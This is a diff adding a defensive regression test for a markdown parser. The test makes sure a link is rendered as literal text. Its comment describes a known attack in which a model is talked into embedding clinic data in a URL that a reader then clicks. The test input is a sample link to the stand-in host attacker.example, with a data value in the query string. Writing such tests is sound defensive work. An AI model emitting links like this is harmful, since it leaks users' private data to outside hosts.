@@ -45,4 +45,29 @@ describe('parseInlineMarkdown', () => {
 
     expect(actual).toEqual([{ text: 'a ** b', isBold: false, isItalic: false, isCode: true }]);
   });
+
+  /**
+   * SJ-15. Exfiltration by rendered link is an explicit attack case: talk the
+   * model into embedding data in a URL and let the reader click it out of the
+   * clinic. Link syntax is unsupported here, so the markup stays literal text
+   * and there is no anchor to click.
+   *
+   * This is a regression test for an absence, which is worth stating: adding
+   * link support later is a reasonable-looking change that would reopen the
+   * case, and this is what makes it fail loudly rather than silently.
+   */
+  it('renders a markdown link as literal text, never as an anchor', () => {
+    const actual = parseInlineMarkdown(
+      'Klik [di sini](http://attacker.example/collect?data=budi) untuk konfirmasi.',
+    );
+
+    expect(actual).toEqual([
+      {
+        text: 'Klik [di sini](http://attacker.example/collect?data=budi) untuk konfirmasi.',
+        isBold: false,
+        isItalic: false,
+        isCode: false,
+      },
+    ]);
+  });
 });
